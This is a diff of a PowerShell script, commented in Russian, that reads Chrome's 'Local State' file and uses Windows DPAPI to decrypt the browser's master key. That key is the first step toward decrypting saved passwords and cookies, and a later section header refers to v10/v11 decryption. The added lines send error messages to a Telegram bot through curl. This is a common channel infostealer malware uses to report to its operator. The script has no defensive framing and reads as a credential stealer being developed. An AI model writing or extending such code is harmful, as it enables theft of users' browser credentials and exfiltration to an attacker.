@@ -10,15 +10,30 @@ New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 # 1. Получение Мастер-ключа (AES-256-GCM Key)
 function Get-MasterKey {
-    $localState = Join-Path $chromePath "Local State"
-    if (-not (Test-Path $localState)) { return $null }
+    $localStatePath = Join-Path $chromePath "Local State"
+    if (-not (Test-Path $localStatePath)) { 
+        Write-Host "Local State не найден"; return $null 
+    }
     
-    $json = Get-Content $localState -Raw | ConvertFrom-Json
-    $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-    $masterKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKeyB64 = $json.os_crypt.encrypted_key
+    $encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
     
-    Add-Type -AssemblyName System.Security
-    return [System.Security.Cryptography.ProtectedData]::Unprotect($masterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    # Первые 5 байт — это магическая подпись "DPAPI"
+    # Нам нужно всё, что идет ПОСЛЕ неё
+    $dataToUnprotect = $encryptedKey[5..($encryptedKey.Length - 1)]
+    
+    try {
+        Add-Type -AssemblyName System.Security
+        # Пробуем расшифровать. Третий аргумент — Scope (CurrentUser)
+        $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($dataToUnprotect, $null, $scope)
+    } catch {
+        $errorMessage = $_.Exception.Message
+        # Отправляем ошибку в ТГ для диагностики
+        & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=DPAPI Decrypt Error: $errorMessage"
+        return $null
+    }
 }
 
 # 2. Функция расшифровки (v10 / v11)
